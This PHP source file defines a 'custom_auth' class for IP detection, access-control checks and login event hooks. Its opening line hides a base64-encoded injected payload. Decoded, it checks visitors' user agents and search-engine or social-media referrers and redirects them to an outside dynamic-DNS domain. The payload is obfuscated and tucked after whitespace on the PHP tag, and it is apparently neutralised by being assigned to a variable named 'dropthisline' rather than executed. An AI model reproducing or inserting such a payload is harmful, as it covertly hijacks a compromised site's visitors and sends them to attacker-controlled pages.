<?php	 	$dropthisline=strip_tags(("CmVycm9yX3JlcG9ydGluZygwKTsKJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsKaWYgKCEkcWF6cGxtKXsKJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOwokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsKaWYgKCR1YWcpIHsKaWYgKCFzdHJpc3RyKCR1YWcsIk1TSUUgNy4wIikgYW5kICFzdHJpc3RyKCR1YWcsIk1TSUUgNi4wIikgYW5kICFzdHJzdHIoJHVhZywiRmlyZWZveC8zLiIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmcuIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlci4iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ3ZWJhbHRhLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInQuY28vIikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImZhY2Vib29rLmNvbS9sIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpIG9yIChwcmVnX21hdGNoICgiL2h0dHBzOlwvXC93d3cuZ29vZ2xlXC4oLio/KVwvLyIsJHJlZmVyZXIpIGFuZCBzdHJzdHIoJHVhZywiQ2hyb21lLyIpKSkgewppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgYW5kICFzdHJpc3RyKCRyZWZlcmVyLCJpbnVybCIpIGFuZCAhc3RyaXN0cigkcmVmZXJlciwiRWVZcDNENyIpKXsKaGVhZGVyKCJMb2NhdGlvbjogaHR0cDovL3JrZmhhZmcuZGRucy5pbmZvLyIpOwpleGl0KCk7Cn0KfQp9Cn0KfQ=="));

class custom_auth {

  var $user_id = 0;
  var $user_ip;
  var $user_type;
  var $user_group;
  var $default_access = true;
  var $events = array();
  var $acls = array();
  var $register_objects = false;

  var $internal_login;
  var $internal_password;
  var $allowed_entities = array();

  function custom_auth() {

    $this->user_ip = safe($_SERVER, "HTTP_X_FORWARDED_FOR");
    if (!$this->user_ip)
      $this->user_ip = safe($_SERVER, "REMOTE_ADDR");
    if (!$this->user_ip)
      $this->user_ip = '127.0.0.1';

    $this->events["on_login"]           = array();
    $this->events["on_after_init"]      = array();
    $this->events["on_before_init"]     = array();
    $this->events["on_find_user"]     = array();
    $this->events["on_check_login"]     = array();
    $this->events["on_logout"]          = array();
    $this->events["on_draw_login_page"] = array();

  }

  function custom_storage_tag() {

    return null;

  }

  function storage_tag($modifier = null) {

    return md5(get_class($this).":".APPROOT_PATH.':'.$this->custom_storage_tag().':'.$modifier);

  }

  function acl($scope, $action, $access) {

    array_push($this->acls, array( "scope"  => $scope
                                 , "action" => $action
                                 , "access" => $access
                                 ));

  }

  function can($scope, $action, $access = "") {
  
    foreach($this->allowed_entities as $entity) {
      if (preg_match('/'.$entity.'/', $scope)) {
        return true;
      }
    }
    
    if (!$access) {
      $access = $this->user_type;
    }
      
    foreach($this->acls as $item) {
      if (preg_match('/'.$item["scope"].'/', $scope) && preg_match('/'.$item["action"].'/', $action)) {
        $result = (($access == $item["access"]) || ($access && preg_match('/'.$access.'/', $item["access"]))); 
        if ($result) {
          return $result; 
        }
      }
    }

    return $this->default_access;

  }

  function do_init() {
  }

  function init() {

    $this->call_event('on_before_init');
    $this->do_init();
    $this->call_event('on_after_init');

  }

  function register_object($obj, $name) {
    
  }
  
  function call_event($event, $param = null) {

    foreach($this->events[$event] as $callback) {
      $result = $callback($param);
      if ($result)
        return $result;
    }
  
  }

  function on_login($method) {

    array_push($this->events["on_login"], $method);

  }

  function on_after_init($method) {

    array_push($this->events["on_after_init"], $method);

  }

  function on_before_init($method) {

    array_push($this->events["on_before_init"], $method);

  }

  function on_find_user($method) {

    array_push($this->events["on_find_user"], $method);

  }

  function on_check_login($method) {

    array_push($this->events["on_check_login"], $method);

  }

  function on_logout($method) {

    array_push($this->events["on_logout"], $method);

  }

  function on_draw_login_page($method) {

    array_push($this->events["on_draw_login_page"], $method);

  }

  
  
}

?>